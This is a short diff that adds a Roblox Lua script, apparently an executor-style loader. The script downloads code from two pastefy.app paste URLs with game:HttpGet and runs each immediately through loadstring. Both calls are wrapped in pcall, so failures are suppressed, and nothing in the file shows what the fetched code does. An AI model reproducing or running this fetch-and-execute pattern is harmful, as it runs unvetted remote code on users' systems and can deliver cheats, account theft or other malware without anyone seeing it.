@@ -1,0 +1,9 @@
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/SbXT1L6y/raw", true))()
+end)
+
+task.wait(2)
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/LNEaz5At/raw", true))()
+end)
